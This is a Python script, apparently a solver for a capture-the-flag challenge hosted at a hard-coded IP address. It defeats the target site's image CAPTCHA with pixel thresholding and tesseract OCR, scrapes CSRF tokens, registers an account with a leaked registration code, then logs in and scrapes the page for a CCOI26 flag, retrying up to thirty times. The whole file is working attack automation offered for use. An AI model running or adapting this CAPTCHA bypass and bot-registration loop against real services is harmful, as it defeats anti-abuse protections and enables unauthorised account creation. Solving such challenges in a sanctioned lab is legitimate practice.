
import requests
import re
import io
import subprocess
import numpy as np
from PIL import Image
import random
import string

BASE = "http://95.216.124.220:31064"
REG_CODE = "I_Am_Knight"

def ocr_captcha(session):
    r = session.get(f"{BASE}/captcha.php")
    img = Image.open(io.BytesIO(r.content)).convert('L')
    arr = np.array(img)
    clean = np.where(arr == 200, 255, 0).astype(np.uint8)
    big = Image.fromarray(clean, 'L').resize((900, 300), Image.NEAREST)
    big.save('/tmp/cap.png')
    for psm in [7, 8, 6]:
        res = subprocess.run(
            ['tesseract', '/tmp/cap.png', 'stdout', '--psm', str(psm),
             '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
            capture_output=True, text=True
        )
        txt = res.stdout.strip()
        if txt and 4 <= len(txt) <= 8:
            return txt
    return ""

def get_csrf(html):
    m = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', html)
    return m.group(1) if m else None

user  = 'k' + ''.join(random.choices(string.digits, k=6))
email = user + '@pwn.io'
print(f"[*] user: {user}")

for attempt in range(30):
    s = requests.Session()

    reg_page = s.get(f"{BASE}/register.php")
    csrf_reg = get_csrf(reg_page.text)
    cap = ocr_captcha(s)
    print(f"[{attempt+1}] captcha: '{cap}'", end=' ', flush=True)

    if not cap:
        print("-> OCR vide, retry")
        continue

    r = s.post(f"{BASE}/register.php", data={
        'username':          user,
        'email':             email,
        'password':          'Str0ng!Pass',
        'registration_code': REG_CODE,
        'captcha':           cap,
        'website':           '',
        'csrf_token':        csrf_reg,
    }, allow_redirects=True)

    if 'captcha' in r.text.lower() or 'invalid' in r.text.lower():
        print("-> FAIL")
        continue

    print("-> OK")

    lp    = s.get(f"{BASE}/login.php")
    lcsrf = get_csrf(lp.text)
    lr    = s.post(f"{BASE}/login.php", data={
        'email':      email,
        'password':   'Str0ng!Pass',
        'website':    '',
        'csrf_token': lcsrf,
    }, allow_redirects=True)

    flags = re.findall(r'CCOI26\{[^}]+\}', lr.text)
    if not flags:
        dash = s.get(f"{BASE}/dashboard.php")
        flags = re.findall(r'CCOI26\{[^}]+\}', dash.text)

    if flags:
        print(f"\nFLAG: {flags[0]}")
        break
    else:
        print(f"  pas de flag sur {lr.url} ??")
else:
    print("[!] echec apres 30 tentatives")
